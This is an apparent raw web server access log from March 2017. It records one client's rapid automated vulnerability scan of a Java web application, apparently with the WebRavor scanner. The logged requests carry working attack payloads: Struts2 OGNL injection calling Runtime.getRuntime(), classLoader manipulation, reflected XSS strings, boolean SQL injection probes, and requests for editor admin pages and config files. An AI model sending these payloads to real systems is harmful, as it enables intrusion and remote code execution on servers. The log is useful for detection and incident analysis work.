42.156.139.71 - - [09/Mar/2017:00:01:11 +0800] "GET /sxzn/foreground/browseMetadata.action;jsessionid=5463CCAB7B8A56CD3C769FB0C758653B HTTP/1.1" 200 26368
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/connections/ HTTP/1.1" 404 1150
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/login.action?redirect:${%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%27xwork_founded%27%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29} HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/viewMetadata.action? HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkReg.action?user.username=%3Cscript%3Ealert%28/Hello%2C+WebRavor%21/%29%3C/script%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/FCKeditor/editor/filemanager/browser/default/browser.html?type=&connector=connectors/aspx/connector.aspx HTTP/1.1" 404 287
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=2024-12-20%27%20aNd%20%27a%27=%27a HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/common/ HTTP/1.1" 404 1135
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/register.action?redirect:${%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%27xwork_founded%27%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29} HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/asp/connector.asp HTTP/1.1" 404 287
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/viewMetadata.action? HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/map/index.html HTTP/1.1" 404 228
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/checkReg.action?user.username=%5C0%5C%22%5C%27%3E%3CScRiPt%3Ealert%28/Hello%2C+WebRavor%21/%29%3B%3C/ScRiPt%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/test.do HTTP/1.1" 404 1096
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=%3Cimg+src%3D%5C%22%23%5C%22/%2A%2A/onerror%3Dalert%28Hello%2C+WebRavor%21/%29+width%3D100%3E HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/login.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/sitemap/index.html HTTP/1.1" 404 232
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/test.htm HTTP/1.1" 404 238
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/? HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/viewMetadata.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d)) HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/wzdt/index.html HTTP/1.1" 404 229
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/test.html HTTP/1.1" 404 239
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkReg.action?user.username=%22+style%3D%22XSS:expression%28alert%28/Hello%2C+WebRavor%21/%29%29%22 HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=2024-12-20%27%20aNd%20%27a%27=%27b HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/register.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:13 +0800] "GET /sxzn/register.action?check=checkbox%20aNd%20126=126 HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/Map.do HTTP/1.1" 404 1021
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/login.action?<script>alert(8408)</script> HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/test.jsp HTTP/1.1" 404 1099
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST http://61.149.153.52:80/sxzn/foreground/viewMetadata.action HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/Map.htm HTTP/1.1" 404 221
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/test.php HTTP/1.1" 404 1099
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkReg.action?user.username=%22%3E%3C/iframe%3E%3Cscript%3Ealert%28/Hello%2C+WebRavor%21/%29%3B%3C/script%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/Map.html HTTP/1.1" 404 222
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=12 HTTP/1.1" 200 18438
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/? HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/test.asp HTTP/1.1" 404 1099
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/viewMetadata.action?id=%25%7B%23_memberAccess%5B'allowStaticMethodAccess'%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean(%22false%22)%2C%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3D%23foo%2C%23rt+%3D+%40java.lang.Runtime%40getRuntime()%7D&%25%7B%23_memberAccess%5B'allowStaticMethodAccess'%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean(%22false%22)%2C%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3D%23foo%2C%23rt+%3D+%40java.lang.Runtime%40getRuntime()%7D HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/SiteMap.shtml HTTP/1.1" 404 1042
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/login.action?var=<script>alert(8408)</script> HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST  HTTP/1.1" 400 226
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/register.action?<script>alert(8408)</script> HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkReg.action?user.username=%3Cscript%3Ealert%28/Hello%2C+WebRavor%21/%29%3B%3C/script%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/inc/conn.inc HTTP/1.1" 404 1111
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/SiteMap.do HTTP/1.1" 404 1033
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/editor/filemanager HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/SiteMap.html HTTP/1.1" 404 226
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/viewMetadata.action?id=1' HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=12 HTTP/1.1" 200 18438
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/editor/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkReg.action?user.username=%22%3E%3C/iframe%3E%3Cimg+src%3D%5C%22%23%5C%22/%2A%2A/onerror%3Dalert%28Hello%2C+WebRavor%21/%29+width%3D100%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/ConversionReport.txt HTTP/1.1" 404 1063
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/login.action?\" onmouseover=alert(8408) var=\"bad HTTP/1.1" 200 7254
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=%25%27%20aNd%20126=126%20aNd%20%27%25%27=%27 HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/ HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/eWebEditor/db/ewebeditor.mdb HTTP/1.1" 404 1159
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/doSearch.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43x.getWriter().println(\"xwork_found\")')(d))&(i99)(('\\43x.getWriter().close()')(d)) HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/viewMetadata.action?id=1%23 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/Output-Build.txt HTTP/1.1" 404 1051
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/register.action?var=<script>alert(8408)</script> HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkReg.action?user.username=%27%22%3E%3Cimg+src%3D%5C%22%23%5C%22/%2A%2A/onerror%3Dalert%28Hello%2C+WebRavor%21/%29+width%3D100%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/eWebEditor/Admin_Login.asp HTTP/1.1" 404 1153
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/WS_FTP.log HTTP/1.1" 404 1033
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/register.action?check=checkbox%20aNd%20126=125 HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/upload/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/logs/errors.log HTTP/1.1" 404 1048
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/doSearch.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/viewMetadata.action?class[%27classLoader%27][%27jarPath%27]=1 HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/saveTemplate.action?template.type= HTTP/1.1" 302 -
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkReg.action?user.username=%3Cimg+src%3D%5C%22%23%5C%22/%2A%2A/onerror%3Dalert%28Hello%2C+WebRavor%21/%29+width%3D100%3E HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=12%20aNd%20126=126 HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=%25%27%20aNd%20126=125%20aNd%20%27%25%27=%27 HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/?class[%27classLoader%27][%27jarPath%27]=1 HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:14 +0800] "GET /sxzn/register.action?\" onmouseover=alert(8408) var=\"bad HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foreground/Web.config HTTP/1.1" 404 1033
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/login/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/2 HTTP/1.1" 404 1255
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/images/messagePage/ HTTP/1.1" 404 1138
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foreground/web.xml HTTP/1.1" 404 1024
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/iisadmin/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foreground/App.config HTTP/1.1" 404 1033
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/doc/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/listTemplate.action?template.type= HTTP/1.1" 302 -
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foreground/config.web HTTP/1.1" 404 1033
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "POST /sxzn/register.action HTTP/1.1" 200 16368
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/connections/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foreground/ HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/checkReg.action?user.username= HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/doSearch.action? HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/foreground/viewMetadata.action?redirect:${%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%27xwork_founded%27%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29} HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/common/ HTTP/1.1" 500 1718
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/saveRegister.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "GET /sxzn/?class[%27classLoader%27][%27resources%27]=1 HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "POST /sxzn/saveRegister.action HTTP/1.1" 200 20876
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/doSearch.action? HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewMetadata.action?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 404 1210
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/checkReg.action?user.username= HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:15 +0800] "POST /sxzn/foreground/browseMetadata.action HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/map/index.html HTTP/1.1" 404 244
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1  HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/selectResult.jsp HTTP/1.1" 200 5843
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/sitemap/index.html HTTP/1.1" 404 248
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=-999%20OR%20126=126 HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1' HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/checkReg.action?user.username=%20aNd%20126=126 HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/doSearch.action? HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/selectResult.jsp?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\\43x\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\\43x.getWriter().println(\"xwork_found\")')(d))&(i99)(('\\43x.getWriter().close()')(d)) HTTP/1.1" 200 5843
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/wzdt/index.html HTTP/1.1" 404 245
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/?redirect:${%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%27xwork_founded%27%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29} HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1%20and%20user>0 HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/Map.do HTTP/1.1" 404 1093
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/register.action?check=checkbox%27%20aNd%20%27a%27=%27a HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/selectResult.jsp?debug=command&expression=%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime() HTTP/1.1" 200 5843
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1%20and%201=2 HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/Map.htm HTTP/1.1" 404 237
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST /sxzn/checkReg.action HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1%CB%27 HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/doSearch.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d)) HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/Map.html HTTP/1.1" 404 238
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/selectResult.jsp? HTTP/1.1" 200 5843
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST /sxzn/saveRegister.action HTTP/1.1" 200 20743
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1; HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/SiteMap.shtml HTTP/1.1" 404 1114
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/browseMetadata.action?d-49747-p=12%20aNd%20126=125 HTTP/1.1" 200 25818
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/saveRegister.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST  HTTP/1.1" 400 226
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/?<script>alert(8408)</script> HTTP/1.1" 200 18576
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/checkLogin.action?user.username=2024-12-20&user.password=2024-12-20&exPassword=-999%20OR%20126=125 HTTP/1.1" 200 7349
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/checkReg.action?user.username=%20aNd%20126=125 HTTP/1.1" 200 1508
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1-- HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/SiteMap.do HTTP/1.1" 404 1105
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST http://61.149.153.52:80/sxzn/doSearch.action HTTP/1.1" 404 1204
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST /sxzn/register.action HTTP/1.1" 200 20611
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/selectResult.jsp HTTP/1.1" 200 5843
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1%23 HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/SiteMap.html HTTP/1.1" 404 242
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/selectResult.jsp?class[%27classLoader%27][%27jarPath%27]=1 HTTP/1.1" 200 5843
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foreground/viewmetadata.action?id=1/* HTTP/1.1" 404 1117
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "GET /sxzn/foregr%250D%250A1dee%250D%250Aound/ConversionReport.txt HTTP/1.1" 404 1135
61.149.17.32 - - [09/Mar/2017:08:28:16 +0800] "POST /sxzn/saveRegister.action HTTP/1.1" 200 20876
